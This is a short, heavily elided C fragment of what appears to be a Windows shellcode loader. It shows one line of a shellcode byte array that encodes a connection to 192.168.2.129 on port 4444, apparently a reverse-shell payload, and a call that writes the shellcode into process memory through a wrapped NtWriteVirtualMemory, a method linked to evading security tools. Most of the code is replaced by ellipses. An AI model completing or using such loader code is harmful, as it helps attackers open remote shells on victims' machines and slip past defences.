...
int main() {
    ...
    unsigned char shellcode[] = 
        ...
        "\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x02\x81\x41\x54"
    ...
    TEST_NtWriteVirtualMemory(GetCurrentProcess(), allocBuffer, shellcode, sizeof(shellcode), &bytesWritten);
